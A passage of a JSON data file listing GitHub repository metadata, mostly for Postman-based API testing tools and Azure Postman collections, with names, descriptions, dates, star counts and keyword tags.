","user","develop","auto","code","automat","environment","framework","function","spec","integration","star","stat","start","tools","development","environments","very","perform","functional","method","system","automation","working","program","report","feature","tech","cloud","complete","product","public","features","automatic","specific","including","track","software","process","writing","remote","according","performance","world","home","specification","expect","technology","specifications","agile","developing","during","fluent","skills","seek","degree","office","least","release","level","frameworks","tracking"]},{"id":178413776,"name":"PostmanToHtml_Markdown","full_name":"zaycodes/PostmanToHtml_Markdown","description":null,"fork":false,"created_at":"2019-03-29T13:48:47Z","updated_at":"2019-10-30T11:34:44Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":22375431,"owner_login":"zaycodes","owner_avatar_url":"https://avatars1.githubusercontent.com/u/22375431?v=4","pulled":1,"tags":[]},{"id":147576433,"name":"letsapi","full_name":"sandipsahoo2k2/letsapi","description":"An easy api html tester like postman","fork":false,"created_at":"2018-09-05T20:35:16Z","updated_at":"2018-09-05T20:37:33Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":5547869,"owner_login":"sandipsahoo2k2","owner_avatar_url":"https://avatars3.githubusercontent.com/u/5547869?v=4","pulled":1,"tags":["test"," postman","html","tester"]},{"id":136303478,"name":"server-upload-download","full_name":"romanshutsman/server-upload-download","description":"You can test it in POSTMAN or download client for this app https://git.io/vhaiL !","fork":false,"created_at":"2018-06-06T09:13:11Z","updated_at":"2018-07-02T11:25:37Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":29098174,"owner_login":"romanshutsman","owner_avatar_url":"https://avatars0.githubusercontent.com/u/29098174?v=4","pulled":1,"tags":["test","client","http","https","load","download"]},{"id":95335669,"name":"rake","full_name":"pigsy/rake","description":"Rake is a full-featured dynamic RPC client for lets you test your RPC services like Paw or Postman for HTTP APIs.","fork":false,"created_at":"2017-06-25T03:14:38Z","updated_at":"2017-06-25T03:41:45Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":1964774,"owner_login":"pigsy","owner_avatar_url":"https://avatars3.githubusercontent.com/u/1964774?v=4","pulled":1,"tags":["test","service","client","services","full","feature","dynamic","lets","featured"]},{"id":92985083,"name":"docker-newman-awscli","full_name":"kt-git/docker-newman-awscli","description":"A docker container based upon the latest official postman newman, with the awscli included as well.","fork":false,"created_at":"2017-05-31T20:17:33Z","updated_at":"2017-05-31T20:17:33Z","stargazers_count":0,"watchers_count":0,"forks":1,"watchers":0,"score":1,"owner_id":28463279,"owner_login":"kt-git","owner_avatar_url":"https://avatars1.githubusercontent.com/u/28463279?v=4","pulled":1,"tags":["test"," postman","based","newman","contain","docker","included","official","container","latest","upon","postman newman","awscli"]},{"id":92407511,"name":"LEX-API-test","full_name":"kbiswakarma/LEX-API-test","description":"This repository currently contains postman collection to run API tests for LEX on AWS","fork":false,"created_at":"2017-05-25T13:44:58Z","updated_at":"2017-05-25T13:44:58Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":18681284,"owner_login":"kbiswakarma","owner_avatar_url":"https://avatars3.githubusercontent.com/u/18681284?v=4","pulled":1,"tags":["test"," postman","collect","collection","repo","postman collection","repos","repository","tests","tests ","contain","rent","current","currently"]},{"id":168934186,"name":"PostmanAzure","full_name":"smereczynski/PostmanAzure","description":null,"fork":false,"created_at":"2019-02-03T10:38:05Z","updated_at":"2019-10-26T09:07:18Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":705653,"owner_login":"smereczynski","owner_avatar_url":"https://avatars3.githubusercontent.com/u/705653?v=4","pulled":1,"tags":[]},{"id":244143772,"name":"AzureStoragePostman","full_name":"shawnweisfeld/AzureStoragePostman","description":null,"fork":false,"created_at":"2020-03-01T12:19:16Z","updated_at":"2020-03-01T14:06:08Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":2466404,"owner_login":"shawnweisfeld","owner_avatar_url":"https://avatars2.githubusercontent.com/u/2466404?v=4","pulled":1,"tags":[]},{"id":210271764,"name":"postman-azure","full_name":"smll25/postman-azure","description":null,"fork":false,"created_at":"2019-09-23T05:31:39Z","updated_at":"2019-09-23T05:31:42Z","stargazers_count":0,"watchers_count":0,"forks":0,"watchers":0,"score":1,"owner_id":28103534,"owner_login":"smll25","owner_avatar_url":"https://avatars2.githubusercontent.com/u/28103534?v=4","pulled":1,"tags":[]},{"id":157935603,"name":"Azure-Postman","full_name":"hhazeley/Azure-Postman","description":null,"fork":false,"created_at":"2018-11-17T00:19:26Z","updated_at":"2019-09-23T23:55:30Z","stargazers_count":1,"watchers_count":1,"forks":0,"watchers":1,"score":1,"owner_id":22698784,"owner_login":"hhazeley","owner_avatar_url":"https://avatars0.githubusercontent.com/u/22698784?v=4","pulled":1,"tags":[]}]